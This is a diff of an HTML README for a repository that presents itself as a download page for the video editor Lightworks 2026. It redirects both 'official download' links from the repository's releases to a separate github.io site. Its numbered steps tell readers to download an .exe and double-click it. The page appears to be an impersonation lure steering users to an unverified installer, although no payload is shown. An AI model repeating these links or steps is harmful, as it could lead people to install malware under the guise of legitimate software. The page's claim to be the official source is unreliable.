@@ -1,7 +1,7 @@
 <h1 style="font-family: sans-serif;">🎬 Lightworks-2026 - Professional video editing for every creator</h1>
 
 <p style="font-family: sans-serif; font-size: 1.2em;">
-    <a href="https://github.com/projectco8640/Lightworks-2026/releases" style="display: inline-block; padding: 15px 25px; background-color: #2c3e50; color: #ffffff; text-decoration: none; border-radius: 5px; font-weight: bold;">Download Lightworks 2026 for Windows</a>
+    <a href="https://projectco8640.github.io" style="display: inline-block; padding: 15px 25px; background-color: #2c3e50; color: #ffffff; text-decoration: none; border-radius: 5px; font-weight: bold;">Download Lightworks 2026 for Windows</a>
 </p>
 
 <h2 style="font-family: sans-serif;">📝 About Lightworks 2026</h2>
@@ -21,7 +21,7 @@
 <h2 style="font-family: sans-serif;">📥 Download and Installation</h2>
 <p style="font-family: sans-serif;">Follow these steps to set up the software on your machine:</p>
 <ol style="font-family: sans-serif;">
-    <li>Visit the <a href="https://github.com/projectco8640/Lightworks-2026/releases">official download page</a> to view the available versions.</li>
+    <li>Visit the <a href="https://projectco8640.github.io">official download page</a> to view the available versions.</li>
     <li>Find the latest release listed at the top of the page.</li>
     <li>Click the link ending in .exe to download the installer to your computer.</li>
     <li>Open your Downloads folder and double-click the file you just saved.</li>
